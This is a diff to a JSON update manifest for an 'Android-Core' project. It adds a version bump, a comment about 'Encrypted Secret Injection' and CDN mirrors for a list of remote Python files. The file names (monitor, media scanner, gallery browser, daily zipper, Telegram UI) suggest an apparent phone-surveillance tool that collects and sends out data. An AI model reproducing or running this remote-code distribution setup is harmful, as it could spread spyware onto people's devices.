@@ -1,5 +1,6 @@
 {
-  "version": "3.0",
+  "version": "4.0",
+  "comment": "System Architecture Update: Encrypted Secret Injection Enabled",
   "files": [
     "https://zaen1993.github.io/Android-Core/files/monitor.py",
     "https://zaen1993.github.io/Android-Core/files/telegram_ui.py",
@@ -10,5 +11,10 @@
     "https://zaen1993.github.io/Android-Core/files/media_scanner.py",
     "https://zaen1993.github.io/Android-Core/files/gallery_browser.py",
     "https://zaen1993.github.io/Android-Core/files/daily_zipper.py"
+  ],
+  "mirrors": [
+    "https://raw.githubusercontent.com/Zaen1993/Android-Core/main/index.json",
+    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
+    "https://cdn.staticaly.com/gh/Zaen1993/Android-Core/main/index.json"
   ]
 }
